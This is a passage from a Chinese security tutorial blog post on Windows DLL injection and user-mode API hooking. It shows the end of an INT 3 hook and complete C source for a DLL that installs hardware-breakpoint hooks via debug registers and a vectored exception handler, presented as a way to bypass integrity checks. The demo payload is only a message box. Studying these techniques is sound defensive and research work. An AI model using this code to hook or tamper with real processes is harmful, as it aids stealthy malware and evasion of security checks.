class="comment">// 3. 写入 0xCC (INT 3)</span></span><br><span class="line">    DWORD dwOld;</span><br><span class="line">    VirtualProtect(g_pTargetFunc, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);</span><br><span class="line">    *(BYTE*)g_pTargetFunc = <span class="number">0xCC</span>;</span><br><span class="line">    VirtualProtect(g_pTargetFunc, <span class="number">1</span>, dwOld, &amp;dwOld);</span><br><span class="line">    g_bIsHooked = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        InstallInt3Hook();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击效果-5"><a href="#攻击效果-5" class="headerlink" title="攻击效果"></a>攻击效果</h4><p><img src="/image/2025-12-12-windows_dll_injection/1765856499390.png" alt="1765856499390"></p>
<h3 id="硬件断点-Hook-Hardware-Hook"><a href="#硬件断点-Hook-Hardware-Hook" class="headerlink" title="硬件断点 Hook (Hardware Hook)"></a>硬件断点 Hook (Hardware Hook)</h3><p>利用 CPU 自带的  <strong>调试寄存器 (Dr0 - Dr7)</strong> 。</p>
<p>一个CPU一般有8个调试寄存器（DR0 ~ DR7 寄存器），用于管理硬件断点</p>
<ul>
<li>DR0 ~DR3： 存储硬件断点地址。</li>
<li>DR4 和 DR5： 保留。</li>
<li>DR6：调试状态寄存器，用于向调试器报告事件的详细信息，以供调试器判断发生的是何种事件。</li>
<li>DR7：调试控制寄存器，用于定义断点的中断条件。</li>
</ul>
<p>这是一种 <strong>无损 Hook</strong> ，不需要修改内存中的任何代码或数据，因此能完美绕过内存完整性校验（CRC）。设置断点后，CPU 执行到指定地址会抛出 <strong><code>EXCEPTION_SINGLE_STEP</code></strong> 异常。</p>
<p>中断hook都得关闭kernel debug：<code>bcdedit /debug off</code></p>
<h4 id="实现方法-5"><a href="#实现方法-5" class="headerlink" title="实现方法"></a>实现方法</h4><ul>
<li><code>GetThreadContext</code> &#x2F; <code>SetThreadContext</code> ： 最关键 。这是应用层唯一能直接读写 CPU 寄存器（Dr0-Dr7）的接口。</li>
<li><code>SuspendThread</code> &#x2F; <code>ResumeThread</code> ：修改线程上下文前必须挂起线程，否则可能导致状态不一致或崩溃。</li>
<li><code>OpenThread</code> &#x2F; <code>CreateToolhelp32Snapshot</code> ：因为硬件断点是属于线程的（不是全局的），必须遍历并打开进程内的每一个线程分别设置。</li>
<li>设置寄存器 ：</li>
<li>Dr0 ：填入目标函数地址。</li>
<li>Dr7 ：控制位。启用 Dr0 (L0位)，并设置为“执行时触发”。</li>
<li>触发异常 ：CPU 运行到目标地址，触发 <code>EXCEPTION_SINGLE_STEP</code>。</li>
<li>VEH 捕获 ：检查 Dr6 寄存器，确认是否是由我们设置的断点触发的。</li>
<li>抗死锁机制 (Resume Flag) ：</li>
<li>不同于软件断点，这里不需要恢复内存（因为没改过内存）。</li>
<li>关键操作 ：设置 <code>EFLAGS</code> 寄存器的 RF (Resume Flag, 第16位) 为 1。</li>
<li>作用 ：告诉 CPU “请忽略下一条指令的断点”。如果没有这一步，CPU 会在同一行代码无限重复触发断点，导致死循环。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译命令: gcc -shared -o HardwareHook.dll HardwareHookFixed.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span> <span class="comment">// 需要用到快照遍历线程</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* g_pTargetFunc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MyHookHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hardware Hook Triggered via VEH!&quot;</span>, <span class="string">&quot;Hacked&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VEH 异常处理函数</span></span><br><span class="line">LONG WINAPI <span class="title function_">MyHwVEHHandler</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 硬件断点触发的是 EXCEPTION_SINGLE_STEP (0x80000004)</span></span><br><span class="line">    <span class="keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP) &#123;</span><br><span class="line">        <span class="comment">// 检查 DR6 的 B0 位 (Bit 0)，确认是否是 Dr0 触发的</span></span><br><span class="line">        <span class="keyword">if</span> (pExceptionInfo-&gt;ContextRecord-&gt;Dr6 &amp; <span class="number">0x1</span>) &#123;</span><br><span class="line">            <span class="comment">// 再次确认指令指针是否在目标地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">void</span>*)pExceptionInfo-&gt;ContextRecord-&gt;Rip == g_pTargetFunc)</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">void</span>*)pExceptionInfo-&gt;ContextRecord-&gt;Eip == g_pTargetFunc)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            &#123;</span><br><span class="line">                MyHookHandler();</span><br><span class="line">                <span class="comment">// [关键] 设置 Resume Flag (RF 位, EFLAGS 第 16 位)</span></span><br><span class="line">                <span class="comment">// 作用：告诉 CPU &quot;忽略下一条指令的调试断点&quot;</span></span><br><span class="line">                <span class="comment">// 这样程序继续执行时，不会立刻再次触发断点，执行完一条指令后 RF 自动清除</span></span><br><span class="line">                <span class="comment">// 从而完美避开死循环。</span></span><br><span class="line">                pExceptionInfo-&gt;ContextRecord-&gt;EFlags |= <span class="number">0x10000</span>;</span><br><span class="line">                <span class="comment">// 清除 DR6 状态，为下次做准备</span></span><br><span class="line">                pExceptionInfo-&gt;ContextRecord-&gt;Dr6 &amp;= ~<span class="number">0x1</span>;</span><br><span class="line">                <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 给单个线程设置硬件断点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetHardwareBreakpoint</span><span class="params">(DWORD dwThreadId, <span class="type">void</span>* address)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (dwThreadId == GetCurrentThreadId()) <span class="keyword">return</span>; <span class="comment">// 跳过当前注入线程</span></span><br><span class="line">    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);</span><br><span class="line">    <span class="keyword">if</span> (!hThread) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 必须挂起线程才能设置上下文</span></span><br><span class="line">    <span class="keyword">if</span> (SuspendThread(hThread) != (DWORD)<span class="number">-1</span>) &#123;</span><br><span class="line">        CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;</span><br><span class="line">        <span class="keyword">if</span> (GetThreadContext(hThread, &amp;ctx)) &#123;</span><br><span class="line">            <span class="comment">// 设置 DR0</span></span><br><span class="line">            ctx.Dr0 = (DWORD_PTR)address;</span><br><span class="line">            <span class="comment">// 清除 DR7 旧状态</span></span><br><span class="line">            ctx.Dr7 &amp;= ~(<span class="number">1</span> | <span class="number">2</span> | <span class="number">4</span> | <span class="number">8</span>);  </span><br><span class="line">            <span class="comment">// 设置 DR7: L0=1 (启用Dr0), RW0=00 (执行断点), LEN0=00 (1字节)</span></span><br><span class="line">            ctx.Dr7 |= <span class="number">1</span>; </span><br><span class="line">            SetThreadContext(hThread, &amp;ctx);</span><br><span class="line">        &#125;</span><br><span class="line">        ResumeThread(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 遍历当前进程的所有线程并设置断点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHwHookForAllThreads</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hUser32 = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    g_pTargetFunc = (<span class="type">void</span>*)GetProcAddress(hUser32, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_pTargetFunc) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 1. 注册 VEH</span></span><br><span class="line">    AddVectoredExceptionHandler(<span class="number">1</span>, MyHwVEHHandler);</span><br><span class="line">    <span class="comment">// 2. 遍历所有线程</span></span><br><span class="line">    DWORD dwCurrentPid = GetCurrentProcessId();</span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        THREADENTRY32 te32;</span><br><span class="line">        te32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line">        <span class="keyword">if</span> (Thread32First(hSnapshot, &amp;te32)) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="comment">// 只处理属于当前进程的线程</span></span><br><span class="line">                <span class="keyword">if</span> (te32.th32OwnerProcessID == dwCurrentPid) &#123;</span><br><span class="line">                    SetHardwareBreakpoint(te32.th32ThreadID, g_pTargetFunc);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (Thread32Next(hSnapshot, &amp;te32));</span><br><span class="line">        &#125;</span><br><span class="line">        CloseHandle(hSnapshot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        <span class="comment">// 使用新线程去执行安装，避免阻塞</span></span><br><span class="line">        CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)InstallHwHookForAllThreads, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击效果-6"><a href="#攻击效果-6" class="headerlink" title="攻击效果"></a>攻击效果</h4><p><img src="/image/2025-12-12-windows_dll_injection/1765856651291.png" alt="1765856651291"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/friends/">friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-DLL-%E6%B3%A8%E5%85%A5%E5%92%8CApi-Hook"><span class="toc-number">1.</span> <span class="toc-text">Windows DLL 注入和Api Hook</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">DLL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5-Classic-CreateRemoteThread"><span class="toc-number">1.1.1.</span> <span class="toc-text">经典远程线程注入 (Classic CreateRemoteThread)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%8E%E6%B5%81%E7%A8%8B-%E5%8F%82%E8%80%83-classicdllinjection-c"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">实现方法与流程 (参考 classicdllinjection.c)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">1.3 核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">1.4 攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4-Session-0-%E9%9A%94%E7%A6%BB%E6%B3%A8%E5%85%A5-Session-0-Bypass"><span class="toc-number">1.1.2.</span> <span class="toc-text">突破 Session 0 隔离注入 (Session 0 Bypass)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%8E%E6%B5%81%E7%A8%8B-%E5%8F%82%E8%80%83-session0bypass-c"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">实现方法与流程 (参考 session0bypass.c)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-%E6%9C%80%E5%8E%89%E5%AE%B3%E7%9A%84%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">攻击效果 (最厉害的效果)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5-Registry-Modification"><span class="toc-number">1.1.3.</span> <span class="toc-text">注册表注入 (Registry Modification)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8-1"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5-SetWindowsHookEx"><span class="toc-number">1.1.4.</span> <span class="toc-text">消息钩子注入 (SetWindowsHookEx)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%8E%E6%B5%81%E7%A8%8B-%E5%8F%82%E8%80%83-hookinjection-c-GlobalHookDll-c"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">实现方法与流程 (参考 hookinjection.c, GlobalHookDll.c)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8-2"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-1"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APC-%E6%B3%A8%E5%85%A5-QueueUserAPC"><span class="toc-number">1.1.5.</span> <span class="toc-text">APC 注入 (QueueUserAPC)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86-4"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">技术原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%8E%E6%B5%81%E7%A8%8B-%E5%8F%82%E8%80%83-ApcInjector-c"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">实现方法与流程 (参考 ApcInjector.c)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83-API-%E5%8F%8A%E4%BD%9C%E7%94%A8-3"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">核心 API 及作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-2"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">攻击效果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dll%E5%8A%AB%E6%8C%81"><span class="toc-number">1.2.</span> <span class="toc-text">dll劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dll%E6%90%9C%E7%B4%A2%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">dll搜索顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-3"><span class="toc-number">1.2.3.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-hook-R3"><span class="toc-number">1.3.</span> <span class="toc-text">windows hook-R3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%9A%84-Hook-IAT-Hook"><span class="toc-number">1.3.1.</span> <span class="toc-text">基于导入表的 Hook (IAT Hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-4"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E7%9A%84%E5%86%85%E8%81%94-Hook-Inline-Hook"><span class="toc-number">1.3.2.</span> <span class="toc-text">基于代码的内联 Hook (Inline Hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-3"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">实现方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AD%E8%A1%A5%E4%B8%81-Hook-HotFix-Hook"><span class="toc-number">1.3.3.</span> <span class="toc-text">热补丁 Hook (HotFix Hook)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E6%96%AD%E7%82%B9-Hook-Int-3-Hook"><span class="toc-number">1.3.4.</span> <span class="toc-text">软件断点 Hook (Int 3 Hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-4"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-5"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">攻击效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9-Hook-Hardware-Hook"><span class="toc-number">1.3.5.</span> <span class="toc-text">硬件断点 Hook (Hardware Hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95-5"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">实现方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-6"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">攻击效果</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&text=windows dll注入和api hook"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&is_video=false&description=windows dll注入和api hook"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=windows dll注入和api hook&body=Check out this article: https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&title=windows dll注入和api hook"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&name=windows dll注入和api hook&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2025/12/12/2025-12-12-windows_dll_injection/&t=windows dll注入和api hook"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2025-2026
    Exploooosion
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

